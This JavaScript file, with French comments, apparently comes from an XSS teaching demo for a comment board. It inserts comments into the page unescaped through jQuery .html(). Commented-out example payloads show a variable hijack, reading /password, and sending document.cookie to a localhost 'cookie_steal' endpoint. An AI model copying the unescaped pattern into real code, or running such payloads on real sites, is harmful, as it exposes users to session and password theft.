let utilisateur = "Chest"

const retrieve_values = function(){
    $.ajax({
        type: 'GET',
        url: '/getvalue',
        success: function(res){
            let text = ""
            res.forEach(comment => {
                text+=comment+"<br>"
            });
            $("#submited_value").html(text)
        },
        error: function(err){
            console.log("on a pas pu retrouver l'information")
        }

    })
}

const submit = function(e){
    const text = $("#text").val()
    $.ajax({
        type: 'POST',
        url:'/setvalue',
        data: JSON.stringify({"text": text}),
        dataType: "json",
        contentType: "application/json",
        success: function(res){
            retrieve_values()
        },
        error: function(err){
            console.log("le texte n'a pas été envoyé")
        }
    })

}

retrieve_values()
$("#submit").on("click", submit)

//Exemples de requêtes pouvant être faites avec du XSS

{/* <script>utilisateur = "Voleur";
console.log(utilisateur)</script> */}

{/* <script>$.ajax({
    method: 'GET',
    url: '/password',
    success: function(res){
        console.log("password volé : "+res)
    },
    error: function(err){
        console.log("password pas récupéré")
    }
})</script> */}

{/* <script>$.ajax({
    method: 'GET',
    url: 'http://localhost:3002/cookie_steal?cookie='+JSON.stringify(document.cookie),
    success: function(res){
        console.log("cookie volé")
    },
    error: function(err){
        console.log("cookie pas volé")
    }
})</script> */}